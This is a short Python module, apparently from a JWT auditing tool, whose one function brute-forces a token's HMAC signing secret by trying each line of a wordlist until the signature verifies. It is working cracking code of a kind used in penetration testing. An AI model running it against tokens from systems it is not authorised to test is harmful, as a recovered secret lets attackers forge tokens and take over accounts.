import jwt
from . import ui


def bruteforce_hmac_secret(token, wordlist_path):
    """Brute force the HMAC secret for a JWT using a wordlist."""
    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                secret = line.strip()
                if not secret:
                    continue
                try:
                    jwt.decode(
                        token,
                        secret,
                        algorithms=["HS256", "HS384", "HS512"],
                        options={"verify_signature": True, "verify_aud": False},
                    )
                    ui.success(f"[+] Secret found: {secret}")
                    return secret
                except Exception:
                    continue
    except FileNotFoundError:
        ui.error(f"Wordlist not found: {wordlist_path}")
        return None

    ui.error("Secret not found in wordlist.")
    return None
